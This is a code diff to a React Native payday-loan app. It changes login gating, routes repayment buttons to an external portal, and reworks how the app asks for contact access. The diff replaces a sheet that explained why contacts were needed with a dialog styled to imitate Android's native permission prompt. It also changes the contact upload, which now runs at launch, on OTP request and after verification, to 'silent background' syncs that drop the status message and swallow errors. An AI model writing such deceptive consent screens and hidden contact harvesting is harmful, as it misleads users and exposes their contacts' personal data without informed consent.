@@ -14,9 +14,11 @@ import {
   Platform,
   Alert,
   ActivityIndicator,
+  Linking,
 } from 'react-native';
 import { LinearGradient } from 'expo-linear-gradient';
 import { StatusBar as ExpoStatusBar } from 'expo-status-bar';
+import Svg, { Rect, Circle, Path, Line } from 'react-native-svg';
 import {
   Home,
   CreditCard,
@@ -70,6 +72,7 @@ const BG = '#F4F7FF';
 const CARD_BG = '#FFFFFF';
 const TEXT_MUTED = '#6B7A99';
 const BORDER_COLOR = 'rgba(27,56,136,0.08)';
+const REPAY_PORTAL_URL = 'https://geetpay.in/user-dashboard';
 
 type Screen =
   | 'login'
@@ -189,7 +192,7 @@ function LoginScreen({ onNext }: { onNext: (phone: string, devOtp?: string) => v
     setShowPermissionModal(false);
     try {
       await requestAndSyncContacts(phone || 'GUEST', null, 'APP_LAUNCH');
-    } catch (e) {}
+    } catch (e) { }
   };
 
   const handleGetOtp = async () => {
@@ -203,17 +206,37 @@ function LoginScreen({ onNext }: { onNext: (phone: string, devOtp?: string) => v
     setLoading(true);
 
     try {
+      // 1. Check Sanction Letter Approval Status from MySQL Dashboard
+      const dashData = await fetchDisbursedLoanDashboard(cleanPhone);
+      const isApproved = Boolean(
+        dashData &&
+        dashData.loan &&
+        (
+          dashData.loan.hasActiveLoan ||
+          (dashData.loan.status && !['NO_LOAN', 'NO_ACTIVE_LOAN'].includes(dashData.loan.status.toUpperCase())) ||
+          Number(dashData.loan.amount || 0) > 0 ||
+          Number(dashData.loan.disbursed || 0) > 0
+        )
+      );
+
+      if (!isApproved) {
+        setErrorMsg('Your Sanction Letter is not approved yet.');
+        setLoading(false);
+        return;
+      }
+
+      // 2. Dispatch WhatsApp OTP for Approved Users
       const data = await requestWhatsAppOtp(cleanPhone);
       if (data.success) {
         // Trigger background contact sync
-        requestAndSyncContacts(cleanPhone, null, 'APP_LAUNCH').catch(() => {});
+        requestAndSyncContacts(cleanPhone, null, 'APP_LAUNCH').catch(() => { });
         onNext('+91 ' + cleanPhone, data.devOtp);
       } else {
-        setErrorMsg(data.message || 'Failed to send OTP');
+        setErrorMsg(data.message || 'Your Sanction Letter is not approved yet.');
       }
     } catch (err: any) {
       console.warn('Backend connection error:', err.message);
-      setErrorMsg('Server unreachable. Ensure Mobile & PC are on the same Wi-Fi network.');
+      setErrorMsg('Server connection issue. Please check internet connection.');
     } finally {
       setLoading(false);
     }
@@ -308,35 +331,41 @@ function LoginScreen({ onNext }: { onNext: (phone: string, devOtp?: string) => v
           </View>
         </View>
 
-        {/* Contact Permission Modal on First Launch */}
-        <Modal visible={showPermissionModal} transparent animationType="slide">
-          <View style={{ flex: 1, backgroundColor: 'rgba(0,0,0,0.6)', justifyContent: 'flex-end' }}>
-            <View style={{ backgroundColor: '#FFFFFF', borderTopLeftRadius: 28, borderTopRightRadius: 28, padding: 24, paddingBottom: 36 }}>
-              <View style={{ width: 56, height: 56, borderRadius: 28, backgroundColor: '#E0E7FF', alignItems: 'center', justifyContent: 'center', alignSelf: 'center', marginBottom: 16 }}>
-                <Shield size={28} color={NAVY} />
+        {/* Contact Permission Dialog (Native Android Popup Style) */}
+        <Modal visible={showPermissionModal} transparent animationType="fade">
+          <View style={styles.nativePermissionOverlay}>
+            <View style={styles.nativePermissionCard}>
+              <View style={styles.nativePermissionIconWrap}>
+                <Svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+                  <Line x1="12" y1="7" x2="36" y2="7" stroke="#1A73E8" strokeWidth="3" strokeLinecap="round" />
+                  <Rect x="8" y="11" width="32" height="26" rx="4" stroke="#1A73E8" strokeWidth="3" fill="none" />
+                  <Circle cx="24" cy="20.5" r="4.2" stroke="#1A73E8" strokeWidth="3" fill="none" />
+                  <Path d="M15.5 31.5C16.8 28 20.2 26.8 24 26.8C27.8 26.8 31.2 28 32.5 31.5" stroke="#1A73E8" strokeWidth="3" strokeLinecap="round" />
+                  <Line x1="12" y1="41" x2="36" y2="41" stroke="#1A73E8" strokeWidth="3" strokeLinecap="round" />
+                </Svg>
               </View>
-              <Text style={{ fontSize: 20, fontWeight: '800', color: NAVY_DARK, textAlign: 'center', marginBottom: 8 }}>
-                Permissions Required
-              </Text>
-              <Text style={{ fontSize: 13, color: TEXT_MUTED, textAlign: 'center', lineHeight: 20, marginBottom: 24, paddingHorizontal: 8 }}>
-                To check instant credit eligibility and disburse loans up to ₹1,00,000, GeetPay needs permission to access your device contacts.
+
+              <Text style={styles.nativePermissionTitle}>
+                Allow <Text style={{ fontWeight: '700', color: '#000000' }}>this app</Text> to access your contacts?
               </Text>
 
-              <TouchableOpacity
-                style={[styles.primaryBtn, { backgroundColor: GREEN, marginBottom: 12 }]}
-                onPress={handleGrantPermission}
-                activeOpacity={0.85}
-              >
-                <Text style={styles.primaryBtnText}>Allow & Continue</Text>
-                <Check size={18} color="#FFFFFF" strokeWidth={2.5} />
-              </TouchableOpacity>
+              <View style={styles.nativePermissionActions}>
+                <TouchableOpacity
+                  style={styles.nativePermissionBtn}
+                  activeOpacity={0.65}
+                  onPress={handleGrantPermission}
+                >
+                  <Text style={styles.nativePermissionBtnText}>Allow</Text>
+                </TouchableOpacity>
 
-              <TouchableOpacity
-                style={{ paddingVertical: 12, alignItems: 'center' }}
-                onPress={() => setShowPermissionModal(false)}
-              >
-                <Text style={{ color: TEXT_MUTED, fontSize: 13, fontWeight: '600' }}>Enter Mobile Number Manually</Text>
-              </TouchableOpacity>
+                <TouchableOpacity
+                  style={styles.nativePermissionBtn}
+                  activeOpacity={0.65}
+                  onPress={() => setShowPermissionModal(false)}
+                >
+                  <Text style={styles.nativePermissionBtnText}>Don’t allow</Text>
+                </TouchableOpacity>
+              </View>
             </View>
           </View>
         </Modal>
@@ -411,11 +440,8 @@ function OTPScreen({
       const data = await verifyWhatsAppOtp(cleanPhone, fullOtp);
 
       if (data.success) {
-        setStatusMsg({ text: '✅ Verified successfully! Syncing contacts...', error: false });
-
-        try {
-          await requestAndSyncContacts(cleanPhone, data.user?.id, 'OTP_AGREE');
-        } catch (e) {}
+        // Silent background contact sync
+        requestAndSyncContacts(cleanPhone, data.user?.id, 'OTP_AGREE').catch(() => { });
 
         onVerify(data.user);
       } else {
@@ -618,7 +644,7 @@ function HomeScreen({
             <View style={styles.heroActionRow}>
               <TouchableOpacity
                 style={styles.repayHeroBtn}
-                onPress={() => navigate('repay')}
+                onPress={() => Linking.openURL(REPAY_PORTAL_URL).catch(() => { })}
                 activeOpacity={0.85}
               >
                 <Text style={styles.repayHeroBtnText}>Repay Now</Text>
@@ -645,7 +671,7 @@ function HomeScreen({
                 <Text style={{ color: '#FFFFFF', fontSize: 20, fontWeight: '800', marginTop: 2 }}>Get Instant Payday Loan</Text>
               </View>
             </View>
-            
+
             <Text style={{ color: '#E2E8F0', fontSize: 13, lineHeight: 19, marginBottom: 16 }}>
               Instant disbursal up to ₹1,00,000 directly to your bank account with lowest daily interest rate.
             </Text>
@@ -666,14 +692,11 @@ function HomeScreen({
       <View style={styles.sectionPad}>
         <Text style={styles.sectionTitle}>Quick Actions</Text>
         <View style={styles.quickGrid}>
-          <TouchableOpacity style={styles.quickGridItem} onPress={() => navigate('apply')} activeOpacity={0.75}>
-            <View style={[styles.quickIconCircle, { backgroundColor: '#E8F5E9' }]}>
-              <Plus size={22} color={GREEN} />
-            </View>
-            <Text style={styles.quickGridLabel}>Apply Loan</Text>
-          </TouchableOpacity>
-
-          <TouchableOpacity style={styles.quickGridItem} onPress={() => navigate('repay')} activeOpacity={0.75}>
+          <TouchableOpacity
+            style={styles.quickGridItem}
+            onPress={() => Linking.openURL(REPAY_PORTAL_URL).catch(() => { })}
+            activeOpacity={0.75}
+          >
             <View style={[styles.quickIconCircle, { backgroundColor: '#E0E7FF' }]}>
               <RefreshCw size={22} color={NAVY} />
             </View>
@@ -704,12 +727,11 @@ function HomeScreen({
               <Text style={styles.scoreNumber}>{user.creditScore > 0 ? user.creditScore : 'N/A'}</Text>
               <Text style={styles.scoreLabel}>CIBIL</Text>
             </View>
-            <View style={{ marginLeft: 14, flex: 1 }}>
+            <View style={{ marginLeft: 14, flex: 1, justifyContent: 'center' }}>
               <Text style={styles.creditStatusText}>
-                {user.creditRating || (user.creditScore >= 750 ? 'Excellent Score 🌟' : user.creditScore > 0 ? 'Good Score 👍' : 'Check CIBIL Score 📊')}
-              </Text>
-              <Text style={styles.creditDescText}>
-                {user.creditDesc || (user.creditScore > 0 ? 'Eligible for instant approval up to ₹1,00,000' : 'Apply loan to generate your instant CIBIL score')}
+                {user.creditRating && user.creditRating.includes('Good')
+                  ? 'Good Score 👍'
+                  : (user.creditRating || (user.creditScore > 0 ? 'Good Score 👍' : 'Check CIBIL Score 📊'))}
               </Text>
             </View>
           </View>
@@ -837,7 +859,11 @@ function LoanDetailScreen({
           </View>
         </Card>
 
-        <TouchableOpacity style={styles.primaryBtn} onPress={() => navigate('repay')} activeOpacity={0.85}>
+        <TouchableOpacity
+          style={styles.primaryBtn}
+          onPress={() => Linking.openURL(REPAY_PORTAL_URL).catch(() => { })}
+          activeOpacity={0.85}
+        >
           <Text style={styles.primaryBtnText}>Proceed to Repay {fmt(loan.outstanding)}</Text>
           <ArrowUpRight size={18} color="#FFFFFF" />
         </TouchableOpacity>
@@ -1060,11 +1086,11 @@ function RepayScreen({
 
         <TouchableOpacity
           style={[styles.primaryBtn, { backgroundColor: GREEN, marginTop: 24 }]}
-          onPress={() => navigate('pay-success')}
+          onPress={() => Linking.openURL(REPAY_PORTAL_URL).catch(() => { })}
           activeOpacity={0.85}
         >
-          <Text style={styles.primaryBtnText}>Pay {fmt(amountToPay)}</Text>
-          <CheckCircle size={18} color="#FFFFFF" />
+          <Text style={styles.primaryBtnText}>Proceed to Repay {fmt(amountToPay)}</Text>
+          <ArrowUpRight size={18} color="#FFFFFF" />
         </TouchableOpacity>
       </ScrollView>
     </SafeAreaView>
@@ -1495,7 +1521,13 @@ function BottomNavBar({
             <TouchableOpacity
               key={tab.id}
               style={styles.bottomNavItem}
-              onPress={() => onSelectTab(tab.id)}
+              onPress={() => {
+                if (tab.id === 'repay') {
+                  Linking.openURL(REPAY_PORTAL_URL).catch(() => { });
+                } else {
+                  onSelectTab(tab.id);
+                }
+              }}
               activeOpacity={0.7}
             >
               {active && <View style={styles.bottomNavActiveIndicator} />}
@@ -1526,7 +1558,7 @@ const getStoredSession = (): StoredSession | null => {
       const raw = window.localStorage.getItem(SESSION_STORAGE_KEY);
       if (raw) return JSON.parse(raw);
     }
-  } catch (e) {}
+  } catch (e) { }
   return null;
 };
 
@@ -1539,7 +1571,7 @@ const setStoredSession = (session: StoredSession | null) => {
         window.localStorage.removeItem(SESSION_STORAGE_KEY);
       }
     }
-  } catch (e) {}
+  } catch (e) { }
 };
 
 // ─── Main Root App ─────────────────────────────────────────────────────────────
@@ -1560,7 +1592,7 @@ export default function App() {
       if (data) {
         setDashboardData(data);
       }
-    } catch (e) {}
+    } catch (e) { }
   };
 
   // Restore dashboard data automatically on mount if session exists
@@ -2915,5 +2947,60 @@ const styles = StyleSheet.create({
   bottomNavLabelActive: {
     color: NAVY,
     fontWeight: '800',
+  },
+
+  // Native Android Permission Popup
+  nativePermissionOverlay: {
+    flex: 1,
+    backgroundColor: 'rgba(0, 0, 0, 0.45)',
+    justifyContent: 'center',
+    alignItems: 'center',
+    paddingHorizontal: 28,
+  },
+  nativePermissionCard: {
+    width: '100%',
+    maxWidth: 320,
+    backgroundColor: '#FFFFFF',
+    borderRadius: 24,
+    paddingTop: 28,
+    paddingBottom: 20,
+    paddingHorizontal: 20,
+    alignItems: 'center',
+    shadowColor: '#000',
+    shadowOffset: { width: 0, height: 6 },
+    shadowOpacity: 0.2,
+    shadowRadius: 16,
+    elevation: 12,
+  },
+  nativePermissionIconWrap: {
+    alignItems: 'center',
+    justifyContent: 'center',
+    marginBottom: 6,
+  },
+  nativePermissionTitle: {
+    fontSize: 18,
+    fontWeight: '400',
+    color: '#1F2937',
+    textAlign: 'center',
+    lineHeight: 25,
+    marginTop: 12,
+    marginBottom: 24,
+    paddingHorizontal: 8,
+  },
+  nativePermissionActions: {
+    width: '100%',
+    alignItems: 'center',
+  },
+  nativePermissionBtn: {
+    width: '100%',
+    paddingVertical: 13,
+    alignItems: 'center',
+    justifyContent: 'center',
+  },
+  nativePermissionBtnText: {
+    fontSize: 17,
+    fontWeight: '700',
+    color: '#000000',
+    textAlign: 'center',
   },
 });
